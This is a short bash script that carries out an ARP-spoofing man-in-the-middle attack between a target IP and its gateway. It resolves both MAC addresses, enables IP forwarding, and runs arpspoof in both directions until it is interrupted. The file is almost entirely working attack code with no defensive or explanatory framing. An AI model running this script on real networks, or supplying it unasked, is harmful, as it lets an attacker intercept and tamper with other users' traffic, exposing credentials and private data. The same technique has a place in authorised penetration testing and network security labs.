#!/bin/bash
# arp spoof - mitm between target and gateway

if [ "$EUID" -ne 0 ]; then
    echo "run as root"
    exit 1
fi

show_usage() {
    echo "usage: ./spoof.sh [-i interface] <target_ip> <gateway_ip>"
}

get_mac() {
    local ip="$1"
    ping -c 1 -W 1 "$ip" &>/dev/null
    arp -n "$ip" 2>/dev/null | grep "$ip" | awk '{print $3}'
}

get_default_iface() {
    ip route | grep default | head -1 | awk '{print $5}'
}

iface=""
while getopts "i:h" opt; do
    case $opt in
        i) iface="$OPTARG" ;;
        h) show_usage; exit 0 ;;
        *) show_usage; exit 1 ;;
    esac
done
shift $((OPTIND - 1))

target="$1"
gateway="$2"

[ -z "$target" ] || [ -z "$gateway" ] && { show_usage; exit 1; }
[ -z "$iface" ] && iface=$(get_default_iface)

if ! command -v arpspoof &>/dev/null; then
    echo "arpspoof not found (install dsniff)"
    exit 1
fi

echo "resolving targets..."
target_mac=$(get_mac "$target")
gateway_mac=$(get_mac "$gateway")

if [ -z "$target_mac" ] || [ "$target_mac" = "(incomplete)" ]; then
    echo "could not resolve target $target"
    exit 1
fi

if [ -z "$gateway_mac" ] || [ "$gateway_mac" = "(incomplete)" ]; then
    echo "could not resolve gateway $gateway"
    exit 1
fi

echo "target:  $target ($target_mac)"
echo "gateway: $gateway ($gateway_mac)"
echo "iface:   $iface"
echo ""

echo "enabling ip forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

cleanup() {
    echo ""
    echo "stopping spoof..."
    kill $pid1 $pid2 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo "restored"
    exit 0
}

trap cleanup INT TERM

echo "spoofing... (ctrl+c to stop)"
arpspoof -i "$iface" -t "$target" "$gateway" &>/dev/null &
pid1=$!
arpspoof -i "$iface" -t "$gateway" "$target" &>/dev/null &
pid2=$!

wait $pid1 $pid2
